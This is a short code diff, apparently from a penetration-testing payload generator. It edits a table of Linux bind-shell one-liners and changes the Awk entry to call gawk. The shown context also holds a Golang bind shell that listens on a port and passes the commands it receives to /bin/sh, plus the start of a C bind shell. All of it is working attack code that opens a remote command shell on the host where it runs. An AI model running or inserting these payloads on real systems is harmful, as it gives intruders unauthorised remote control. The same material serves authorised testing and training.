@@ -45,7 +45,7 @@ const BIND_LINUX_PAYLOADS = {
 
   "Golang Bind": `echo 'package main;import("net";"os/exec";"net/textproto");func main(){{l,_:=net.Listen("tcp","0.0.0.0:{port}");c,_:=l.Accept();r:=textproto.NewReader(c);for{{cmd,_:=r.ReadLine();out,_:=exec.Command("/bin/sh","-c",cmd).CombinedOutput();c.Write(out)}}}}' > /tmp/b.go && go run /tmp/b.go`,
 
-  "Awk Bind": `awk 'BEGIN {{s="/inet/tcp/{port}/0/0";while(1){{do{{printf "shell>" |& s;s |& getline c;if(c){{while((c |& getline)>0)print $0 |& s;close(c);}}}}while(c != "exit");close(s);}}}}'`,
+  "Awk Bind": `gawk 'BEGIN {{s="/inet/tcp/{port}/0/0";while(1){{do{{printf "shell>" |& s;s |& getline c;if(c){{while((c |& getline)>0)print $0 |& s;close(c);}}}}while(c != "exit");close(s);}}}}'`,
 
   "C Bind Shell": `#include <stdio.h>
 #include <sys/socket.h>
